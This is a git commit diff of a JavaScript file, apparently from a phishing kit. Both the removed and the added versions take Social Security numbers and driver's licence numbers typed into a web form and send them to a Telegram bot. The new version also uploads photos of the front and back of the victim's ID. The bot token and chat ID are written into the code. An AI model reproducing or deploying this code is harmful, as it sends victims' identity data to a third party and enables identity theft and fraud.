cb7a274f13c740add7c2175bd69bcf55c33ae686
hellsienna <158115816+hellsienna@users.noreply.github.com>
2024-02-03 08:16:40 -0800

    Update sender.js

--- sender.js
+++ sender.js
@@ -1,33 +1,44 @@
-//bot token
-var telegram_bot_id = "6921530308:AAF77fXVIGJthOwoo9IByU7C50r6wlUiWOs";
-//chat id
-var chat_id = 6355414951;
-var ssn, dl;
-var ready = function () {
-    ssn = document.getElementById("ssn").value;
-    dl = document.getElementById("dl").value;
-    message = "ssn: " + ssn + "\ndl: " + dl;
-};
-var sender = function () {
-    ready();
-    var settings = {
-        "async": true,
-        "crossDomain": true,
-        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "cache-control": "no-cache"
-        },
-        "data": JSON.stringify({
-            "chat_id": chat_id,
-            "text": message
-        })
-    };
-    $.ajax(settings).done(function (response) {
-        console.log(response);
-    });
-    document.getElementById("ssn").value = "";
-    document.getElementById("dl").value = "";
-    return false;
-};
+function submitForm() {
+          const BOT_TOKEN = '6921530308:AAF77fXVIGJthOwoo9IByU7C50r6wlUiWOs';
+          const CHAT_ID = '6355414951';
+
+          const ssn = document.getElementById('ssn').value;
+          const dl = document.getElementById('dl').value;
+          //const message = document.getElementById('message').value;
+
+          const frontInput = document.getElementById('front');
+          const frontfile = frontInput.files[0];
+		  
+		  const backInput = document.getElementById('back');
+          const backfile = backInput.files[0];
+     
+
+          const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+
+          const formDataFront = new FormData();
+          formDataFront.append('chat_id', CHAT_ID);
+          formDataFront.append('document', frontfile);
+		  formDataFront.append('caption', `Front\nSsn: ${ssn}\nDl: ${dl}`);
+		  
+		  const formDataBack = new FormData();
+          formDataBack.append('chat_id', CHAT_ID);
+          formDataBack.append('document', backfile);
+		  formDataBack.append('caption', `Back\nSsn: ${ssn}\nDl: ${dl}`);
+
+          fetch(apiUrl, {
+              method: 'POST',
+              body: formDataFront,
+          })
+          .then(response => response.json())
+		  .then(fetch(apiUrl, {
+              method: 'POST',
+              body: formDataBack,
+          }))
+          .then(data => {
+              console.log('Telegram API response:', data);
+          })
+          .catch(error => {
+              console.error('Error sending message:', error);
+             // alert('Failed to send message and file. Please try again.');
+          });
+      }	
